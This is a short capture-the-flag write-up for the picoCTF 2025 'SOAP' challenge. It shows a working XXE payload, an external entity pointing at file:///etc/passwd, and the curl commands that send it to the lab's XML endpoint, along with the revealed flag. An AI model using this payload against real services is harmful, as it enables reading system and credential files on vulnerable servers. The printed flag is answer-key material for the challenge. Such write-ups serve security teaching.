# picoCTF 2025 – SOAP Challenge Writeup

**Challenge**: SOAP  
**Description**: The web project was rushed and no security assessment was done. Can you read the `/etc/passwd` file?

---

We inspected the web portal and saw that it uses `application/xml` in POST requests to `/data`. This hinted at a potential XXE (XML External Entity) vulnerability.

We crafted a benign XML to confirm the service accepts XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
  <ID>1</ID>
</data>
```

Sent using:

```bash
curl -X POST http://saturn.picoctf.net:55207/data \
  -H "Content-Type: application/xml" \
  --data-binary @safe_payload.xml
```

✅ Output: Displayed valid data.

---

Next, we created an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>
```

Sent it with:

```bash
curl -X POST http://saturn.picoctf.net:55207/data \
  -H "Content-Type: application/xml" \
  --data-binary @xxe_payload.xml
```

🎯 Response included the contents of `/etc/passwd` and the flag:

**picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}**
